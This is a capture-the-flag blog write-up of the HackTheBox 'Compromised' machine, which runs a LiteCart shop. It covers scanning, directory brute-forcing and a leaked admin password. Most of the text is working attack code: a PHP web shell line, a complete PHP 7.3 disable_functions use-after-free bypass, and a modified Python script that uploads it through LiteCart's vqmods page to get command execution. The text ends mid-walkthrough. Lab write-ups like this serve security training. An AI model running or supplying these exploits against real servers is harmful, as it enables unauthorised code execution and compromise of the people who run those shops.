---
title: Compromised Machine - Writeup 
author: Software User 
date: 2021-02-04 16:31:00 +0800
--- 

![Desktop View]({{ "assets/img/htb-machines/compromised/1.png" | relative_url }})

---

<strong><span style="color:#ff5555">Introduction</span></strong>

---

Compromised machine released on 12 Sep 2020 on Hackthebox and create by [D4nch3n](https://www.hackthebox.eu/home/users/profile/103781)

<span style="color:#ff5555">The blog is for educational purposes only.</span>

---

--- 

<strong ><span style="color:#ff5555">Enumeration</span></strong>

<strong><span style="color:#ff5555">IP-: 10.10.10.207</span></strong>

As always, I added IP In hosts file.

---

<p><code class="language-plaintext highlighter-rouge">softwareuser@parrot:~ sudo nmap -sC -sS -sV -T4 -A -oN nmap/intial_scan compromised.htb </code></p>

![Desktop View]({{ "/assets/img/htb-machines/compromised/2.png" | relative_url }})

-sC for default scripts
-sV for Version detection
-sS for SYN scan 
-T4 for speeding up Scan
-A  for Advanced and Aggressive features 
-oN for Output

```
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
```
--- 

<strong><span style="color:#ff5555">Web-Page</span></strong>

---

Litecart is running on web page. LiteCart e-commerce platform built with PHP, jQuery and HTML 5.

![Desktop View]({{ "/assets/img/htb-machines/compromised/main.png"}})

Nothing intresting lets dir brute.

<p><code class="language-plaintext highlighter-rouge">gobuster dir -u compromised.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 | tee gobuster/gobuster.log </code></p>

![Desktop View]({{ "/assets/img/htb-machines/compromised/3.png" | relative_url}})


# Directories
```
/.hta 
/.htpasswd 
/.htaccess 
/backup 
/index.php 
/server-status 
/shop 
````
in backup dir got an tar.gz file 

![Desktop View]({{ "/assets/img/htb-machines/compromised/4.png" | relative_url }})

Extracting tar file  

![Desktop View]({{ "/assets/img/htb-machines/compromised/5.png" | relative_url}})

Lots of file in extracted folder 

![Desktop View]({{ "/assets/img/htb-machines/compromised/6.png" | relative_url}})

after some enumeration i got file where we can see location of hidden log file  in /admin/login.php

Login php - 

```
if (isset($_POST['login'])) {
    //file_put_contents("./.log2301c9430d8593ae.txt", "User: " . $_POST['username'] . " Passwd: " . $_POST['password']);
    user::login($_POST['username'], $_POST['password'], $redirect_url, isset($_POST['remember_me']) ? $_POST['remember_me'] : false);
}

```

file name - [./.log2301c9430d8593ae.txt]

so i tried to access it on web page. We can access it on -:  (http://compromised.htb/shop/admin/.log2301c9430d8593ae.txt)

![Desktop View]({{ "/assets/img/htb-machines/compromised/7.png" | relative_url }})
 
we got a password and username also on web page we have an login page we can try to login. 

```
User: admin Passwd: theNextGenSt0r3!~
```

![Desktop View]({{ "/assets/img/htb-machines/compromised/main2.png" | relative_url }})


Logged in admin panel and in the bottom we can see version of web page  

![Desktop View]({{ "/assets/img/htb-machines/compromised/8.png" | relative_url }})

<strong><span style="color:#ff5555">LiteCart 2.1.2</span></strong>

Searching exploit of LiteCart Version by searchsploit 

![Desktop View]({{ "/assets/img/htb-machines/compromised/9.png" | relative_url }})

now we can exploit litecart. Run the exploit 

```python 45267.py -t http://10.10.10.207/shop/admin/ -p 'theNextGenSt0r3!~' -u admin```

got noting we probably need to edit the script 

edit exploit code so we can see php version -

```
files = {
        'vqmod': (rand + ".php", "<?php if( isset( $_REQUEST['c'] ) ) { system( $_REQUEST['c'] . ' 2>&1' ); } ?>", "application/xml"),
        'token':one,
        'upload':(None,"Upload")
    }
```

```
to this 
`files = {
        'vqmod': (rand + ".php", "<?php phpinfo(); ?>", "application/xml"),
        'token':one,
        'upload':(None,"Upload")
}
```    

also remove print r.content from line72 

run the exploit now and our shell is uploaded

![Desktop View]({{ "/assets/img/htb-machines/compromised/10.png"}})

now we can see php versionin disablefunctions we can see a lot functions we can't execute 

![Desktop View]({{ "/assets/img/htb-machines/compromised/main3.png" | relative_url }})

and the php version is vunlreable and there is an bypass available [Link](https://packetstormsecurity.com/files/154728/PHP-7.3-disable_functions-Bypass.html) we also need to modify python-exploit and bypass.php. 

edit bypass  

```
to 
pwn("uname -a");

to this 
pwn("c")
```
so final exploit and bypass will be 

mybypass.php  
```php

<?php
pwn($_REQUEST['c']);

function pwn($cmd) {
    global $abc, $helper;

    function str2ptr(&$str, $p = 0, $s = 8) {
        $address = 0;
        for($j = $s-1; $j >= 0; $j--) {
            $address <<= 8;
            $address |= ord($str[$p+$j]);
        }
        return $address;
    }

    function ptr2str($ptr, $m = 8) {
        $out = "";
        for ($i=0; $i < $m; $i++) {
            $out .= chr($ptr & 0xff);
            $ptr >>= 8;
        }
        return $out;
    }

    function write(&$str, $p, $v, $n = 8) {
        $i = 0;
        for($i = 0; $i < $n; $i++) {
            $str[$p + $i] = chr($v & 0xff);
            $v >>= 8;
        }
    }

    function leak($addr, $p = 0, $s = 8) {
        global $abc, $helper;
        write($abc, 0x68, $addr + $p - 0x10);
        $leak = strlen($helper->a);
        if($s != 8) { $leak %= 2 << ($s * 8) - 1; }
        return $leak;
    }

    function parse_elf($base) {
        $e_type = leak($base, 0x10, 2);

        $e_phoff = leak($base, 0x20);
        $e_phentsize = leak($base, 0x36, 2);
        $e_phnum = leak($base, 0x38, 2);

        for($i = 0; $i < $e_phnum; $i++) {
            $header = $base + $e_phoff + $i * $e_phentsize;
            $p_type  = leak($header, 0, 4);
            $p_flags = leak($header, 4, 4);
            $p_vaddr = leak($header, 0x10);
            $p_memsz = leak($header, 0x28);

            if($p_type == 1 && $p_flags == 6) { # PT_LOAD, PF_Read_Write
                # handle pie
                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;
                $data_size = $p_memsz;
            } else if($p_type == 1 && $p_flags == 5) { # PT_LOAD, PF_Read_exec
                $text_size = $p_memsz;
            }
        }

        if(!$data_addr || !$text_size || !$data_size)
            return false;

        return [$data_addr, $text_size, $data_size];
    }

    function get_basic_funcs($base, $elf) {
        list($data_addr, $text_size, $data_size) = $elf;
        for($i = 0; $i < $data_size / 8; $i++) {
            $leak = leak($data_addr, $i * 8);
            if($leak - $base > 0 && $leak - $base < $text_size) {
                $deref = leak($leak);
                # 'constant' constant check
                if($deref != 0x746e6174736e6f63)
                    continue;
            } else continue;

            $leak = leak($data_addr, ($i + 4) * 8);
            if($leak - $base > 0 && $leak - $base < $text_size) {
                $deref = leak($leak);
                # 'bin2hex' constant check
                if($deref != 0x786568326e6962)
                    continue;
            } else continue;

            return $data_addr + $i * 8;
        }
    }

    function get_binary_base($binary_leak) {
        $base = 0;
        $start = $binary_leak & 0xfffffffffffff000;
        for($i = 0; $i < 0x1000; $i++) {
            $addr = $start - 0x1000 * $i;
            $leak = leak($addr, 0, 7);
            if($leak == 0x10102464c457f) { # ELF header
                return $addr;
            }
        }
    }

    function get_system($basic_funcs) {
        $addr = $basic_funcs;
        do {
            $f_entry = leak($addr);
            $f_name = leak($f_entry, 0, 6);

            if($f_name == 0x6d6574737973) { # system
                return leak($addr + 8);
            }
            $addr += 0x20;
        } while($f_entry != 0);
        return false;
    }

    class ryat {
        var $ryat;
        var $chtg;

        function __destruct()
        {
            $this->chtg = $this->ryat;
            $this->ryat = 1;
        }
    }

    class Helper {
        public $a, $b, $c, $d;
    }

    if(stristr(PHP_OS, 'WIN')) {
        die('This PoC is for *nix systems only.');
    }

    $n_alloc = 10; # increase this value if you get segfaults

    $contiguous = [];
    for($i = 0; $i < $n_alloc; $i++)
        $contiguous[] = str_repeat('A', 79);

    $poc = 'a:4:{i:0;i:1;i:1;a:1:{i:0;O:4:"ryat":2:{s:4:"ryat";R:3;s:4:"chtg";i:2;}}i:1;i:3;i:2;R:5;}';
    $out = unserialize($poc);
    gc_collect_cycles();

    $v = [];
    $v[0] = ptr2str(0, 79);
    unset($v);
    $abc = $out[2][0];

    $helper = new Helper;
    $helper->b = function ($x) { };

    if(strlen($abc) == 79) {
        die("UAF failed");
    }

    # leaks
    $closure_handlers = str2ptr($abc, 0);
    $php_heap = str2ptr($abc, 0x58);
    $abc_addr = $php_heap - 0xc8;

    # fake value
    write($abc, 0x60, 2);
    write($abc, 0x70, 6);

    # fake reference
    write($abc, 0x10, $abc_addr + 0x60);
    write($abc, 0x18, 0xa);

    $closure_obj = str2ptr($abc, 0x20);

    $binary_leak = leak($closure_handlers, 8);
    if(!($base = get_binary_base($binary_leak))) {
        die("Couldn't determine binary base address");
    }

    if(!($elf = parse_elf($base))) {
        die("Couldn't parse ELF header");
    }

    if(!($basic_funcs = get_basic_funcs($base, $elf))) {
        die("Couldn't get basic_functions address");
    }

    if(!($zif_system = get_system($basic_funcs))) {
        die("Couldn't get zif_system address");
    }

    # fake closure object
    $fake_obj_offset = 0xd0;
    for($i = 0; $i < 0x110; $i += 8) {
        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));
    }

    # pwn
    write($abc, 0x20, $abc_addr + $fake_obj_offset);
    write($abc, 0xd0 + 0x38, 1, 4); # internal func type
    write($abc, 0xd0 + 0x68, $zif_system); # internal func handler

    ($helper->b)($cmd);

    exit();
}


```

and 45267.py 

```python
import mechanize
import cookielib
import urllib2
import requests
import sys
import argparse
import random
import string
parser = argparse.ArgumentParser(description='LiteCart')
parser.add_argument('-t',
                    help='admin login page url - EX: https://IPADDRESS/admin/')
parser.add_argument('-p',
                    help='admin password')
parser.add_argument('-u',
                    help='admin username')
args = parser.parse_args()
if(not args.u or not args.t or not args.p):
    sys.exit("-h for help")
url = args.t
user = args.u
password = args.p

br = mechanize.Browser()
cookiejar = cookielib.LWPCookieJar()
br.set_cookiejar( cookiejar )
br.set_handle_equiv( True )
br.set_handle_redirect( True )
br.set_handle_referer( True )
br.set_handle_robots( False )
br.addheaders = [ ( 'User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1' ) ]
response = br.open(url)
br.select_form(name="login_form")
br["username"] = user
br["password"] = password
res = br.submit()
response = br.open(url + "?app=vqmods&doc=vqmods")
one=""
for form in br.forms():
    one= str(form).split("(")
    one= one[1].split("=")
    one= one[1].split(")")
    one = one[0]
cookies = br._ua_handlers['_cookies'].cookiejar
cookie_dict = {}
for c in cookies:
    cookie_dict[c.name] = c.value
bypass = open('bypass.php', 'r').read()

files = {
        'vqmod': ("mybypass.php", bypass, "application/xml"),
        'token':one,
        'upload':(None,"Upload")
    }
response = requests.post(url + "?app=vqmods&doc=vqmods", files=files, cookies=cookie_dict)
r = requests.get(url + "../vqmod/xml/mybypass.php?c=id")
if r.status_code == 200:
    print "Shell => " + url + "../vqmod/xml/mybypass.php"
else:
    print "Sorry something went wrong"

```

Let's run the exploit again 

![Desktop View]({{ "/assets/img/htb-machines/compromised/png.11"}})